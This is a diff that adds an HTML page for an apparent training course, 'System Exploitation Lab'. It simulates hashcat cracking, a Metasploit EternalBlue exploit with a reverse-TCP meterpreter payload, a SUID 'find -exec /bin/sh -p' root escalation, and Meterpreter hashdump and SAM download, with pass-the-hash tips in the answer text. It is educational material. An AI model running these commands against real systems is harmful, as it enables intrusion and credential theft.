@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <script src="../../../components/AccessGuard.js"></script>
+  <script>AccessGuard.require('sorted');</script>
+  <script src="../../../components/AchievementManager.js"></script>
+  <script src="../../../components/ModuleProgress.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FEH-05: System Exploitation Lab</title>
+  <style>
+    :root{--hp:#6b21a8;--ha:#9333ea;--tg:#00ff41;--bg:#0a0a0a;--tbg:#0d1117;}
+    *{box-sizing:border-box;margin:0;padding:0;}
+    body{background:var(--bg);color:#e2e8f0;font-family:'Courier New',monospace;min-height:100vh;}
+    header{background:rgba(107,33,168,.15);border-bottom:1px solid rgba(107,33,168,.3);padding:14px 24px;display:flex;align-items:center;gap:16px;}
+    .back{color:var(--ha);text-decoration:none;font-size:20px;}
+    h1{color:var(--ha);font-size:1.05rem;}
+    .prog{margin-left:auto;font-size:.8rem;color:#9ca3af;}
+    .tabs{display:flex;gap:4px;padding:12px 24px;background:rgba(0,0,0,.3);border-bottom:1px solid rgba(107,33,168,.2);flex-wrap:wrap;}
+    .tab{padding:6px 14px;border:1px solid rgba(107,33,168,.3);border-radius:4px;cursor:pointer;font-size:.8rem;color:#9ca3af;background:transparent;transition:.2s;}
+    .tab.active{background:var(--hp);color:#fff;border-color:var(--hp);}
+    .tab.done{border-color:var(--tg);color:var(--tg);}
+    .ex{display:none;padding:20px;max-width:900px;margin:0 auto;}
+    .ex.active{display:block;}
+    h2{color:var(--ha);margin-bottom:8px;font-size:1rem;}
+    p{color:#9ca3af;font-size:.85rem;margin-bottom:12px;line-height:1.6;}
+    .hint-btn{background:rgba(107,33,168,.2);border:1px solid rgba(107,33,168,.4);color:var(--ha);padding:4px 12px;border-radius:4px;cursor:pointer;font-size:.8rem;margin-bottom:10px;}
+    .hint-box{background:rgba(107,33,168,.1);border-left:3px solid var(--ha);padding:10px;font-size:.82rem;color:#c4b5fd;margin-bottom:12px;display:none;}
+    .terminal{background:var(--tbg);border:1px solid rgba(0,255,65,.2);border-radius:6px;margin-bottom:14px;overflow:hidden;}
+    .term-bar{background:rgba(0,0,0,.5);padding:6px 12px;font-size:.75rem;color:#6b7280;border-bottom:1px solid rgba(0,255,65,.1);}
+    .term-output{padding:10px;min-height:120px;max-height:240px;overflow-y:auto;font-size:.8rem;line-height:1.75;}
+    .tl{color:var(--tg);}
+    .tl.dim{color:#4b5563;}
+    .tl.warn{color:#fbbf24;}
+    .tl.hi{color:#c084fc;}
+    .tl.red{color:#f87171;}
+    .term-input-row{display:flex;align-items:center;padding:7px 12px;border-top:1px solid rgba(0,255,65,.15);gap:8px;}
+    .prompt{color:var(--ha);white-space:nowrap;font-size:.85rem;}
+    .term-input{flex:1;background:transparent;border:none;color:var(--tg);font-family:inherit;font-size:.85rem;outline:none;}
+    .btn{background:var(--hp);border:none;color:#fff;padding:8px 20px;border-radius:4px;cursor:pointer;font-size:.85rem;transition:.2s;margin-right:8px;}
+    .btn:hover{background:var(--ha);}
+    .result{margin-top:12px;padding:10px;border-radius:4px;font-size:.85rem;display:none;}
+    .result.ok{background:rgba(0,255,65,.1);border:1px solid rgba(0,255,65,.3);color:var(--tg);}
+    .result.err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#f87171;}
+    input[type=text]{background:var(--tbg);border:1px solid rgba(107,33,168,.3);color:var(--tg);padding:6px 10px;border-radius:4px;font-size:.82rem;font-family:inherit;}
+    /* Ex1 crack panel */
+    .crack-options{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;}
+    .crack-opt{background:rgba(13,17,23,.8);border:2px solid rgba(107,33,168,.3);border-radius:6px;padding:10px;cursor:pointer;text-align:center;transition:.2s;}
+    .crack-opt:hover,.crack-opt.selected{border-color:var(--ha);}
+    .crack-opt.selected{background:rgba(107,33,168,.15);}
+    .crack-opt h4{color:var(--ha);font-size:.82rem;margin-bottom:4px;}
+    .crack-opt p{font-size:.75rem;color:#6b7280;margin:0;}
+    select{background:var(--tbg);border:1px solid rgba(107,33,168,.3);color:#e2e8f0;padding:6px 8px;border-radius:4px;font-size:.8rem;font-family:inherit;margin-right:8px;}
+    .progress-track{background:rgba(13,17,23,.9);border:1px solid rgba(107,33,168,.2);border-radius:4px;height:20px;overflow:hidden;margin-bottom:6px;position:relative;}
+    .progress-fill{height:100%;background:linear-gradient(90deg,var(--hp),var(--ha));transition:width .3s;width:0;}
+    .progress-label{position:absolute;right:8px;top:2px;font-size:.72rem;color:#e2e8f0;}
+    /* Ex3 suid */
+    .suid-item{display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px solid rgba(107,33,168,.1);}
+    .suid-item:last-child{border:none;}
+    .suid-path{color:var(--tg);font-size:.82rem;flex:1;}
+    .suid-badge{padding:2px 8px;border-radius:3px;font-size:.72rem;}
+    .exploit-btn{background:rgba(107,33,168,.2);border:1px solid var(--ha);color:var(--ha);padding:3px 10px;border-radius:3px;cursor:pointer;font-size:.75rem;}
+    .complete-btn{display:block;margin:20px auto 0;background:linear-gradient(135deg,var(--hp),var(--ha));border:none;color:#fff;padding:12px 32px;border-radius:6px;cursor:pointer;font-size:.9rem;}
+  </style>
+</head>
+<body>
+<header>
+  <a href="../index.html" class="back">&#8592;</a>
+  <h1>FEH-05: System Exploitation Lab</h1>
+  <div class="prog" id="prog">0 / 4 complete</div>
+</header>
+<div class="tabs">
+  <button class="tab active" onclick="showEx(0)">Exercise 1</button>
+  <button class="tab" onclick="showEx(1)">Exercise 2</button>
+  <button class="tab" onclick="showEx(2)">Exercise 3</button>
+  <button class="tab" onclick="showEx(3)">Exercise 4</button>
+</div>
+
+<!-- EX1: Password Cracking -->
+<div class="ex active" id="ex0">
+  <h2>Exercise 1: Password Cracking Simulation</h2>
+  <p>Select attack mode and hash type, then start the crack session. Observe how different modes perform against different hash algorithms.</p>
+  <button class="hint-btn" onclick="toggleHint('h1')">Show Hint</button>
+  <div class="hint-box" id="h1">Dictionary attacks use wordlists (fast, limited). Brute force tries all combinations (slow, complete). Rules apply mutations (capitalize, append numbers). MD5/NTLM crack fast; bcrypt is designed to be slow.</div>
+  <div class="crack-options">
+    <div class="crack-opt" id="opt-dict" onclick="selectMode('dict')"><h4>Dictionary</h4><p>Uses rockyou.txt wordlist</p></div>
+    <div class="crack-opt" id="opt-brute" onclick="selectMode('brute')"><h4>Brute Force</h4><p>All combinations (?l?d)</p></div>
+    <div class="crack-opt" id="opt-rules" onclick="selectMode('rules')"><h4>Rules-Based</h4><p>Dictionary + mutations</p></div>
+  </div>
+  <div style="display:flex;align-items:center;gap:8px;margin-bottom:12px">
+    <label style="font-size:.82rem;color:#9ca3af">Hash Type:</label>
+    <select id="hash-type"><option value="md5">MD5</option><option value="ntlm">NTLM</option><option value="sha256">SHA-256</option><option value="bcrypt">bcrypt</option></select>
+    <button class="btn" onclick="startCrack()">Start Session</button>
+  </div>
+  <div class="terminal">
+    <div class="term-bar">Hashcat Simulator // hashcat -a [mode] -m [hash] hashes.txt wordlist</div>
+    <div class="term-output" id="crack-out"><div class="tl dim">// Select mode and hash type, then start session</div></div>
+  </div>
+  <div class="progress-track"><div class="progress-fill" id="crack-prog"></div><div class="progress-label" id="crack-pct">0%</div></div>
+  <div id="crack-q" style="display:none;margin-top:12px">
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">Which hash type cracked the fastest?</div>
+      <input type="text" id="q1a" placeholder="hash type name" style="width:200px">
+    </div>
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What password was cracked from the MD5 hash?</div>
+      <input type="text" id="q1b" placeholder="cracked password" style="width:200px">
+    </div>
+    <button class="btn" onclick="checkEx1()">Check Answers</button>
+    <div class="result" id="r1"></div>
+  </div>
+</div>
+
+<!-- EX2: Metasploit -->
+<div class="ex" id="ex1">
+  <h2>Exercise 2: Metasploit Framework Basics</h2>
+  <p>Step through a Metasploit exploitation workflow in the msfconsole terminal. Commands: <code style="color:var(--tg)">search ms17_010</code>, <code style="color:var(--tg)">use 0</code>, <code style="color:var(--tg)">set RHOSTS 10.0.0.1</code>, <code style="color:var(--tg)">set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>, <code style="color:var(--tg)">set LHOST 10.0.0.99</code>, <code style="color:var(--tg)">exploit</code>.</p>
+  <button class="hint-btn" onclick="toggleHint('h2')">Show Hint</button>
+  <div class="hint-box" id="h2">In Metasploit: search finds modules, use selects one, show options lists required params, set fills them in, run/exploit launches the attack. info shows module details.</div>
+  <div class="terminal">
+    <div class="term-bar">msfconsole // Metasploit Framework 6.3</div>
+    <div class="term-output" id="msf-out">
+      <div class="tl hi">       =[ metasploit v6.3.25-dev                          ]</div>
+      <div class="tl hi">+ -- --=[ 2329 exploits - 1219 auxiliary - 413 post    ]</div>
+      <div class="tl hi">+ -- --=[ 1385 payloads - 46 encoders - 11 nops         ]</div>
+      <div class="tl dim">// Type commands below. Start with: search ms17_010</div>
+    </div>
+    <div class="term-input-row"><span class="prompt">msf6&gt;</span><input class="term-input" id="msf-in" placeholder="search ms17_010" onkeydown="if(event.key==='Enter')runMSF()"></div>
+  </div>
+  <div id="msf-q" style="display:none;margin-top:12px">
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What module did you select to exploit MS17-010?</div>
+      <input type="text" id="q2a" placeholder="exploit/..." style="width:360px">
+    </div>
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What session type was opened after exploit succeeded?</div>
+      <input type="text" id="q2b" placeholder="session type" style="width:200px">
+    </div>
+    <button class="btn" onclick="checkEx2()">Check Answers</button>
+    <div class="result" id="r2"></div>
+  </div>
+</div>
+
+<!-- EX3: Privilege Escalation -->
+<div class="ex" id="ex2">
+  <h2>Exercise 3: Linux Privilege Escalation</h2>
+  <p>You're logged in as <code style="color:var(--tg)">www-data</code>. Find a path to root. Try: <code style="color:var(--tg)">id</code>, <code style="color:var(--tg)">find / -perm -4000 2>/dev/null</code>, <code style="color:var(--tg)">cat /etc/crontab</code>, <code style="color:var(--tg)">uname -a</code>.</p>
+  <button class="hint-btn" onclick="toggleHint('h3')">Show Hint</button>
+  <div class="hint-box" id="h3">SUID binaries run as their owner (often root). Check GTFOBins for exploitable SUID binaries. Writable cron scripts run as root on schedule. Kernel version may have public exploits.</div>
+  <div class="terminal">
+    <div class="term-bar">Linux Shell // Target: 10.0.0.1 // User: www-data</div>
+    <div class="term-output" id="lin-out"><div class="tl dim">// You have a shell as www-data. Escalate to root.</div></div>
+    <div class="term-input-row"><span class="prompt">www-data@target:~$</span><input class="term-input" id="lin-in" placeholder="id" onkeydown="if(event.key==='Enter')runLinux()"></div>
+  </div>
+  <div id="lin-q" style="display:none;margin-top:12px">
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">Which SUID binary did you use to escalate privileges?</div>
+      <input type="text" id="q3a" placeholder="binary name" style="width:200px">
+    </div>
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What user did you escalate to?</div>
+      <input type="text" id="q3b" placeholder="username" style="width:200px">
+    </div>
+    <button class="btn" onclick="checkEx3()">Check Answers</button>
+    <div class="result" id="r3"></div>
+  </div>
+</div>
+
+<!-- EX4: Post-Exploitation -->
+<div class="ex" id="ex3">
+  <h2>Exercise 4: Post-Exploitation with Meterpreter</h2>
+  <p>You have a Meterpreter session. Use commands: <code style="color:var(--tg)">sysinfo</code>, <code style="color:var(--tg)">getuid</code>, <code style="color:var(--tg)">hashdump</code>, <code style="color:var(--tg)">download SAM</code>, <code style="color:var(--tg)">ps</code>, <code style="color:var(--tg)">migrate [PID]</code>.</p>
+  <button class="hint-btn" onclick="toggleHint('h4')">Show Hint</button>
+  <div class="hint-box" id="h4">hashdump requires SYSTEM privileges. After dumping, pass-the-hash lets you auth to other systems without cracking. migrate moves your process into a stable host process (explorer.exe).</div>
+  <div class="terminal">
+    <div class="term-bar">Meterpreter // Session 1 opened (10.0.0.99:4444 -> 10.0.0.1:49231)</div>
+    <div class="term-output" id="met-out">
+      <div class="tl hi">[*] Meterpreter session 1 opened</div>
+      <div class="tl dim">// You have a meterpreter shell. Explore the system.</div>
+    </div>
+    <div class="term-input-row"><span class="prompt">meterpreter&gt;</span><input class="term-input" id="met-in" placeholder="sysinfo" onkeydown="if(event.key==='Enter')runMet()"></div>
+  </div>
+  <div id="met-q" style="display:none;margin-top:12px">
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What OS and hostname did sysinfo reveal?</div>
+      <input type="text" id="q4a" placeholder="OS name or hostname" style="width:300px">
+    </div>
+    <div style="background:rgba(13,17,23,.8);border:1px solid rgba(107,33,168,.25);border-radius:6px;padding:10px;margin-bottom:8px">
+      <div style="font-size:.82rem;color:#9ca3af;margin-bottom:6px">What is the Administrator NTLM hash from hashdump?</div>
+      <input type="text" id="q4b" placeholder="hash value" style="width:380px">
+    </div>
+    <button class="btn" onclick="checkEx4()">Check Answers</button>
+    <div class="result" id="r4"></div>
+  </div>
+  <button class="complete-btn" id="fin-btn" onclick="finishLab()" style="display:none">Mark Lab Complete</button>
+</div>
+
+<script>
+let done=[false,false,false,false];
+let crackDone=false,msfStage=0,linStage=0,metCmds=new Set();
+function showEx(n){document.querySelectorAll('.ex').forEach((e,i)=>e.classList.toggle('active',i===n));document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',i===n));}
+function markTab(n){document.querySelectorAll('.tab')[n].classList.add('done');}
+function toggleHint(id){const h=document.getElementById(id);h.style.display=h.style.display==='block'?'none':'block';}
+function updateProg(){document.getElementById('prog').textContent=done.filter(Boolean).length+' / 4 complete';}
+function addLine(outId,text,cls){const o=document.getElementById(outId);const d=document.createElement('div');d.className='tl '+(cls||'');d.textContent=text;o.appendChild(d);o.scrollTop=o.scrollHeight;}
+
+// EX1 Crack
+let crackMode='';
+function selectMode(m){crackMode=m;['dict','brute','rules'].forEach(x=>document.getElementById('opt-'+x).classList.remove('selected'));document.getElementById('opt-'+m).classList.add('selected');}
+function startCrack(){
+  if(!crackMode){alert('Select an attack mode first.');return;}
+  const ht=document.getElementById('hash-type').value;
+  const out=document.getElementById('crack-out');out.innerHTML='';
+  addLine('crack-out',`[*] Starting hashcat session: Mode=${crackMode} HashType=${ht.toUpperCase()}`);
+  addLine('crack-out','[*] Loaded 4 hashes from hashes.txt');
+  addLine('crack-out','[*] Attacking...');
+  const speeds={md5:500,ntlm:800,sha256:300,bcrypt:8};
+  const ms=speeds[ht];
+  let prog=0;
+  const bar=document.getElementById('crack-prog');
+  const pct=document.getElementById('crack-pct');
+  const iv=setInterval(()=>{
+    prog+=crackMode==='brute'?2:crackMode==='rules'?4:6;
+    prog=Math.min(100,prog);
+    bar.style.width=prog+'%';pct.textContent=prog+'%';
+    if(prog>=100){
+      clearInterval(iv);
+      const results={md5:['5f4dcc3b5aa765d61d8327deb882cf99:password123','e10adc3949ba59abbe56e057f20f883e:123456'],
+        ntlm:['aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:Guest (empty)','aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:Administrator:Password'],
+        sha256:['5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password'],
+        bcrypt:['[!] bcrypt: Exhausted wordlist, 0 cracked. GPU time: 14m32s. Consider smaller scope.']};
+      results[ht].forEach(l=>addLine('crack-out','[CRACKED] '+l,'warn'));
+      if(ht!=='bcrypt')addLine('crack-out',`[*] Session complete. ${ht==='sha256'?1:2} of 4 hashes cracked.`);
+      crackDone=true;
+      document.getElementById('crack-q').style.display='block';
+    }
+  },ms);
+}
+function checkEx1(){
+  const a=document.getElementById('q1a').value.trim().toLowerCase();
+  const b=document.getElementById('q1b').value.trim().toLowerCase();
+  const r=document.getElementById('r1');r.style.display='block';
+  if((a.includes('md5')||a.includes('ntlm'))&&(b.includes('password123')||b.includes('password')||b.includes('123456'))){
+    r.className='result ok';r.textContent='Correct! MD5 and NTLM are fast hashes not designed for passwords — crackers can try billions per second. bcrypt/scrypt/Argon2 are password-specific algorithms with intentional slowness.';
+    if(!done[0]){done[0]=true;updateProg();}markTab(0);
+  }else{r.className='result err';r.textContent='Run multiple hash types and compare speed. Check the CRACKED output for the MD5 password.';}
+}
+
+// EX2 Metasploit
+const msfDB={
+  'search ms17_010':['Matching Modules','=================','   #  Name                                      Disclosure Date  Rank    Check','   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       great   Yes','   1  auxiliary/scanner/smb/smb_ms17_010         2017-03-14       normal  Yes'],
+  'use 0':['[*] Using configured payload windows/x64/meterpreter/reverse_tcp','msf6 exploit(windows/smb/ms17_010_eternalblue) >'],
+  'show options':['Module options (exploit/windows/smb/ms17_010_eternalblue):','   Name    Current Setting  Required  Description','   RHOSTS                   yes       Target address range','   LPORT   4444             yes       Listen port (def 4444)','Payload options:','   LHOST                    yes       Listen address'],
+  'set rhosts 10.0.0.1':['RHOSTS => 10.0.0.1'],
+  'set lhost 10.0.0.99':['LHOST => 10.0.0.99'],
+  'set payload windows/x64/meterpreter/reverse_tcp':['payload => windows/x64/meterpreter/reverse_tcp'],
+  'exploit':['[*] Started reverse TCP handler on 10.0.0.99:4444','[*] 10.0.0.1:445 - Connecting to target for exploitation.','[+] 10.0.0.1:445 - Connection established for exploitation.','[*] Sending all shims for MS17-010','[+] 10.0.0.1:445 - ETERNALBLUE overwrite completed','[*] Generating shellcode...','[*] Sending shellcode (201308 bytes)','[+] 10.0.0.1:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=','[+] 10.0.0.1:445 -   WIN !!!','[*] Meterpreter session 1 opened (10.0.0.99:4444 -> 10.0.0.1:49231)'],
+  'run':['[*] Started reverse TCP handler on 10.0.0.99:4444','[*] Meterpreter session 1 opened'],
+  'info':['Name: MS17-010 EternalBlue SMB Remote Code Execution','Module: exploit/windows/smb/ms17_010_eternalblue','Rank: Great','Reliability: No side effects','References: CVE-2017-0144, MS17-010'],
+};
+function runMSF(){
+  const inp=document.getElementById('msf-in');const q=inp.value.trim().toLowerCase();inp.value='';
+  addLine('msf-out','msf6> '+q);
+  const key=Object.keys(msfDB).find(k=>q===k||q.includes(k.split(' ')[0])&&(k.split(' ')[1]?q.includes(k.split(' ')[1]):true));
+  const out=msfDB[q]||msfDB[key]||['[-] Unknown command: '+q+'. Try: search ms17_010, use 0, show options, set RHOSTS, exploit'];
+  out.forEach(l=>addLine('msf-out',l,l.includes('WIN')||l.includes('session')?'warn':l.includes('[-]')?'red':''));
+  if(q==='exploit'||q==='run')document.getElementById('msf-q').style.display='block';
+}
+function checkEx2(){
+  const a=document.getElementById('q2a').value.trim().toLowerCase();
+  const b=document.getElementById('q2b').value.trim().toLowerCase();
+  const r=document.getElementById('r2');r.style.display='block';
+  if((a.includes('ms17_010')||a.includes('eternalblue')||a.includes('exploit/windows'))&&(b.includes('meterpreter')||b.includes('session'))){
+    r.className='result ok';r.textContent='Correct! exploit/windows/smb/ms17_010_eternalblue opened a Meterpreter session. Meterpreter is an in-memory payload — it leaves minimal disk artifacts compared to a standard shell.';
+    if(!done[1]){done[1]=true;updateProg();}markTab(1);
+  }else{r.className='result err';r.textContent='Check the module name from the search output. The session type is shown in the [*] Meterpreter session line.';}
+}
+
+// EX3 Linux PrivEsc
+const linDB={
+  'id':['uid=33(www-data) gid=33(www-data) groups=33(www-data)'],
+  'whoami':['www-data'],
+  'uname -a':['Linux target 4.15.0-54-generic #58-Ubuntu SMP x86_64 GNU/Linux'],
+  'uname -r':['4.15.0-54-generic'],
+  'cat /etc/crontab':['*/5 * * * * root /opt/scripts/backup.sh','0 * * * * root /usr/local/bin/cleanup.py','SHELL=/bin/sh','PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin'],
+  'ls -la /opt/scripts/':['total 8','-rwxrwxrwx 1 root root 124 Jan 15 backup.sh','[!] backup.sh is world-writable — owned by root but writable by all!'],
+  'find / -perm -4000 2>/dev/null':['find / -perm -4000 2>/dev/null','/usr/bin/find','/usr/bin/vim.basic','/usr/bin/passwd','/usr/bin/newgrp','/usr/bin/pkexec','/usr/bin/chfn','/bin/su','/usr/bin/sudo'],
+  'find / -perm -u=s -type f 2>/dev/null':['find / -perm -u=s -type f 2>/dev/null','/usr/bin/find','/usr/bin/vim.basic','/usr/bin/passwd','/usr/bin/sudo','/bin/su'],
+  '/usr/bin/find . -exec /bin/sh -p \\; -quit':['# id','uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)','[+] SUID exploit via find — effective UID is now root!','root@target:~#'],
+  'sudo -l':['Sorry, user www-data may not run sudo on this host.'],
+  'cat /etc/shadow':['cat: /etc/shadow: Permission denied'],
+  'ls /home':['debian  sysadmin  jmorales'],
+  'env':['USER=www-data','SHELL=/bin/sh','HOME=/var/www','PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'],
+};
+let escalated=false;
+function runLinux(){
+  const inp=document.getElementById('lin-in');const q=inp.value.trim();inp.value='';
+  const prompt=escalated?'root@target:~#':'www-data@target:~$';
+  addLine('lin-out',prompt+' '+q);
+  const lq=q.toLowerCase();
+  const key=Object.keys(linDB).find(k=>lq===k.toLowerCase()||lq.includes(k.toLowerCase().split(' ')[0])&&k.toLowerCase().split(' ').every(p=>lq.includes(p)));
+  const out=linDB[q]||linDB[key]||['bash: '+q.split(' ')[0]+': command not found'];
+  out.forEach(l=>addLine('lin-out',l,l.includes('[+]')||l.includes('root')?'warn':l.includes('[!]')?'hi':''));
+  if(q.includes('find')&&q.includes('exec')&&q.includes('sh')){escalated=true;document.getElementById('lin-q').style.display='block';}
+}
+function checkEx3(){
+  const a=document.getElementById('q3a').value.trim().toLowerCase();
+  const b=document.getElementById('q3b').value.trim().toLowerCase();
+  const r=document.getElementById('r3');r.style.display='block';
+  if((a.includes('find'))&&(b.includes('root'))){
+    r.className='result ok';r.textContent='Correct! /usr/bin/find with SUID — GTFOBins documents this exact technique. SUID on find allows spawning root shell via -exec. Always verify SUID binaries against GTFOBins.';
+    if(!done[2]){done[2]=true;updateProg();}markTab(2);
+  }else{r.className='result err';r.textContent='Run: find / -perm -4000 2>/dev/null to find SUID binaries. Then use GTFOBins syntax for /usr/bin/find to escalate.';}
+}
+
+// EX4 Meterpreter
+const metDB={
+  'sysinfo':['Computer        : WIN-TARGET01','OS              : Windows 10 (Build 18363).','Architecture    : x64','System Language : en_US','Domain          : MERIDIANTECH','Logged On Users : 3','Meterpreter     : x64/windows'],
+  'getuid':['Server username: NT AUTHORITY\\SYSTEM'],
+  'hashdump':['Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::','Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::','jmorales:1001:aad3b435b51404eeaad3b435b51404ee:e4ab2c37e2c6e2fd75b5fc6e4fc93a80:::'],
+  'download sam':['[*] Downloading: SAM -> /root/.msf4/loot/SAM','[+] sam: Download succeeded.'],
+  'download':['Usage: download [src] [dst]'],
+  'ps':['Process List','============','PID   Name              Arch  User','392   explorer.exe      x64   MERIDIANTECH\\jmorales','520   svchost.exe       x64   NT AUTHORITY\\SYSTEM','1204  chrome.exe        x64   MERIDIANTECH\\jmorales'],
+  'migrate 520':['[*] Migrating from 4356 to 520...','[+] Migration completed successfully.','[*] Now running inside: svchost.exe (NT AUTHORITY\\SYSTEM)'],
+  'migrate 392':['[*] Migrating to explorer.exe (392)...','[+] Migration completed successfully.'],
+  'shell':['[*] Channel 1 created.','C:\\Windows\\system32>'],
+  'getsystem':['...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).','meterpreter > getuid','Server username: NT AUTHORITY\\SYSTEM'],
+  'run post/multi/recon/local_exploit_suggester':['[*] 10.0.0.1 - Collecting local exploits for x64/windows...','[+] 10.0.0.1 - exploit/windows/local/cve_2020_1054_drawtextex: The target appears to be vulnerable.','[+] 10.0.0.1 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.'],
+  'help':['Core Commands: background, sessions, shell, migrate, exit','Stdapi: sysinfo, getuid, ps, download, upload, hashdump','Post: run post/...'],
+};
+function runMet(){
+  const inp=document.getElementById('met-in');const q=inp.value.trim().toLowerCase();inp.value='';
+  addLine('met-out','meterpreter> '+q);
+  const key=Object.keys(metDB).find(k=>q===k||q.startsWith(k.split(' ')[0])&&(k.split(' ')[1]?q.includes(k.split(' ')[1]):true));
+  const out=metDB[q]||metDB[key]||['[-] Unknown command: '+q+'. Type help for command list.'];
+  out.forEach(l=>addLine('met-out',l,l.includes('[+]')||l.includes('SYSTEM')?'warn':l.includes('[-]')?'red':''));
+  if(q==='hashdump')document.getElementById('met-q').style.display='block';
+}
+function checkEx4(){
+  const a=document.getElementById('q4a').value.trim().toLowerCase();
+  const b=document.getElementById('q4b').value.trim().toLowerCase();
+  const r=document.getElementById('r4');r.style.display='block';
+  if((a.includes('win-target01')||a.includes('windows 10')||a.includes('meridiantech'))&&(b.includes('32ed87bdb5fdc5e9cba88547376818d4')||b.includes('32ed87'))){
+    r.className='result ok';r.textContent='Correct! WIN-TARGET01 running Windows 10, Administrator NTLM: 32ed87bdb5fdc5e9cba88547376818d4. This hash can be used for Pass-the-Hash attacks against other domain systems without cracking.';
+    if(!done[3]){done[3]=true;updateProg();}markTab(3);
+    document.getElementById('fin-btn').style.display='block';
+  }else{r.className='result err';r.textContent='Run sysinfo for system info and hashdump for the Administrator hash. The NTLM hash is the last 32-char field in the hashdump output.';}
+}
+function finishLab(){
+  if(typeof ModuleProgress!=='undefined')ModuleProgress.complete('dark-arts','dark-arts-feh-05',{returnUrl:'../index.html'});
+  else alert('Lab complete!');
+}
+</script>
+<script src="../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
